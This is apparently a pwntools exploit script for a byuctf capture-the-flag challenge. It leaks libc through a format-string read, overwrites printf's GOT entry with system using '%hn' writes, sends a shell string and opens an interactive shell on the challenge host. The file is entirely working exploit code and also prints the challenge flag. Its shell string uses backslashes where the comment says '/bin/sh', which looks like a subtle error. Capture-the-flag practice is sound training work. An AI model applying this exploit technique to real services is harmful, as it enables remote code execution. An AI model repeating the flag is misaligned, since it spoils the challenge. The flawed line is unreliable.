#!/usr/bin/env python3

from pwn import *

exe = ELF("./all_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe



if args.LOCAL:
    r = process([exe.path])
else:
    r = remote("all.chal.cyberjousting.com", 1348)


def my_divide(system_address):
    result = []

    temp = []
    temp.append(system_address & 0xffff)
    temp.append(0)
    result.append(temp)

    temp = []
    system_address = system_address >> 16
    temp.append(system_address & 0xffff)
    temp.append(2)
    result.append(temp)

    temp = []
    system_address = system_address >> 16
    temp.append(system_address & 0xffff)
    temp.append(4)
    result.append(temp)

    return sorted(result, key=lambda x: x[0])



def main():


    input()
    
    #Stage 1: Leak libc
    r.sendline(b"%15$p")

    leak_addr = int(r.recvline()[:-1],16)

    print("leak_addr: ", hex(leak_addr))
    libc.address = leak_addr - 0x29d90
    print("libc: ", hex(libc.address))




    target_address = exe.got['printf']

    system_address = libc.sym['system']

    result = my_divide(system_address)

    #Stage 2: Overwrite GOT
    #I'm a bit lazy so I copied the old script :)) (write 6 bytes). In this challenge, you just need to overwrite the last 4 bytes of printf@got
    payload = f'%{result[0][0]}c%14$hn'.encode()
    payload += f'%{result[1][0]-result[0][0]}c%15$hn'.encode()
    payload += f'%{result[2][0]-result[1][0]}c%16$hn'.encode()
    payload = payload.ljust(64, b"A")
    payload += p64(target_address+result[0][1])
    payload += p64(target_address+result[1][1])
    payload += p64(target_address+result[2][1])


    r.sendline(payload)


    #Stage 3: Win (printf("/bin/sh") -> system("/bin/sh"))
    binsh = b"\\bin\\sh\x00"
    r.sendline(binsh)


    # good luck pwning :)
    # byuctf{too_many_options_what_do_I_chooooooose}


    r.interactive()


if __name__ == "__main__":
    main()
